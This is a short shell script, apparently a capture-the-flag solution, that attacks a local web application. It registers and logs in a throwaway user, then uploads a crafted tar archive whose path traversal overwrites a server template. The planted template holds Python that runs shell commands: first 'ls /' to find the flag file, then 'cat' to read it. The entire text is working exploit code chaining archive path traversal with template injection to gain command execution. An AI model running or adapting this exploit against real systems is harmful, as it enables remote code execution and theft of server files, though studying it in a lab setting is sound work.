username=$(cat /dev/urandom | tr -d -C 'a-z' | head -c 20)

URL="http://${HOST:-localhost}:${PORT:-14000}"

curl -X POST --data "username=${username}&password=a" "${URL}/register"
curl -c cookie.txt -X POST --data "username=${username}&password=a" "${URL}/login"
post=$(curl -s -b cookie.txt "${URL}" | grep -E -o 'posts/[0-9a-f]{32}/[0-9a-f]{32}')

mkdir exploit
cat <<DOC > template
<%
import subprocess
a = subprocess.getoutput("ls /")
%>
{{a}}
DOC
(cd exploit; tar czf exploit.tar.gz -P ../template)

curl -b cookie.txt -X POST -F 'attachment=@exploit/exploit.tar.gz' "${URL}/upload"
flagname=$(curl -s -b cookie.txt "${URL}/${post}" | grep flag)
echo "flag is at $flagname"

cat <<DOC > template
<%
import subprocess
a = subprocess.getoutput("cat /${flagname}")
%>
{{a}}
DOC
(cd exploit; tar czf exploit.tar.gz -P ../template)
curl -b cookie.txt -X POST -F 'attachment=@exploit/exploit.tar.gz' "${URL}/upload"
curl -b cookie.txt "${URL}/${post}"

rm -r exploit cookie.txt template
